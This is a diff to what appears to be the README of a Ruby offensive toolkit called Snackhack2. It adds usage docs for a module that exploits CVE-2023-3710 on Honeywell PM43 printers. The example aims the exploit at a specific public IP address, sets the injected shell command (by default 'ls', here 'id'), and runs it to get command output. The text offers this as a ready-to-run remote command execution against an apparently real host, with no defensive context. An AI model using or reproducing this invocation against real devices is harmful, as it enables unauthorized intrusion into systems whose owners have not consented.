@@ -203,6 +203,19 @@ ca.ethereum
 ca.bitcoincash
 ca.dogecoin
 ```
+## Honeywell PM43
+
+This will exploit CVE-2023-3710. By default it uses the `ls` command.  This can be changed. 
+
+```ruby
+s = Snackhack2::HoneywellPM43.new("http://81.84.149.129:80")
+
+# The command can be changed as seen below. 
+s.command = "id"
+puts s.command
+# This will run the exploit. and print out the command output.
+s.run
+```
 
 ## Phone Number Extractor
 
